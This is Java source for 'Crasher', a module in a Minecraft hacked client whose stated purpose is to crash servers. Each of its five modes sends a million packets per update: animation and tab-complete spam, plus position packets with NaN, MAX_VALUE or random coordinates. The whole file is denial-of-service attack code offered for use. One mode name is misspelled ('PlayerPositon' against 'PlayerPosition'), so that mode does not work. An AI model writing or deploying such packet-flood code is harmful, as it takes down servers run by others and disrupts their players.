package de.crazymemecoke.features.modules.impl.exploits;

import de.crazymemecoke.features.modules.ModuleInfo;
import de.crazymemecoke.manager.settingsmanager.Setting;
import de.crazymemecoke.manager.eventmanager.Event;
import de.crazymemecoke.manager.eventmanager.impl.EventUpdate;
import de.crazymemecoke.features.modules.Category;
import de.crazymemecoke.features.modules.Module;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C14PacketTabComplete;

import static net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition;
import static net.minecraft.network.play.client.C03PacketPlayer.C06PacketPlayerPosLook;

@ModuleInfo(name = "Crasher", category = Category.EXPLOITS, description = "You can crash servers with this module")
public class Crasher extends Module {

    public Setting mode = new Setting("Mode", this, "PacketAnimation", new String[] {"PacketAnimation", "TabComplete", "PlayerPositon", "PlayerPosLook-1", "PlayerPosLook-2"});

    @Override
    public void onToggle() {

    }

    @Override
    public void onEnable() {

    }

    @Override
    public void onDisable() {

    }

    private void doPlayerPosLook2() {
        int x = 1;
        int y = 1;
        int z = 1;
        for (int i = 0; i < 1000000; i++) {
            x += 999 * Math.random();
            z += 999 * Math.random();
            y += mc.thePlayer.motionY;

            mc.thePlayer.sendQueue.addToSendQueue(new C06PacketPlayerPosLook(x, y, z,
                    (float) (mc.thePlayer.rotationYaw + Math.random()),
                    (float) (mc.thePlayer.rotationPitch + Math.random()), false));
        }
    }

    private void doPlayerPosLook1() {
        for (int i = 0; i < 1000000; i++) {
            mc.thePlayer.sendQueue.addToSendQueue(
                    new C04PacketPlayerPosition(Double.NaN, Double.NaN, Double.NaN, Boolean.TRUE));
            mc.thePlayer.sendQueue.addToSendQueue(new C04PacketPlayerPosition(Double.MAX_VALUE,
                    Double.MIN_VALUE, Double.MAX_VALUE, Boolean.TRUE));
        }
    }

    private void doPlayerPosition() {
        for (int i = 0; i < 1000000; i++) {
            mc.thePlayer.sendQueue.addToSendQueue(
                    new C04PacketPlayerPosition(Double.NaN, Double.NaN, Double.NaN, Boolean.TRUE));
            mc.thePlayer.sendQueue.addToSendQueue(new C04PacketPlayerPosition(Double.MAX_VALUE,
                    Double.MIN_VALUE, Double.MAX_VALUE, Boolean.TRUE));
        }

    }

    private void doTabComplete() {
        for (int i = 0; i < 1000000; i++) {
            mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/"));
        }
    }

    private void doPacketAnimation() {
        for (int i = 0; i < 1000000; i++) {
            mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
        }
    }

    @Override
    public void onEvent(Event event) {
        if(event instanceof EventUpdate) {
            if (state()) {
                switch (mode.getCurrentMode()) {
                    case "PacketAnimation": {
                        doPacketAnimation();
                        break;
                    }
                    case "TabComplete": {
                        doTabComplete();
                        break;
                    }
                    case "PlayerPosition": {
                        doPlayerPosition();
                        break;
                    }
                    case "PlayerPosLook-1": {
                        doPlayerPosLook1();
                        break;
                    }
                    case "PlayerPosLook-2": {
                        doPlayerPosLook2();
                        break;
                    }
                }
            }
        }
    }
}
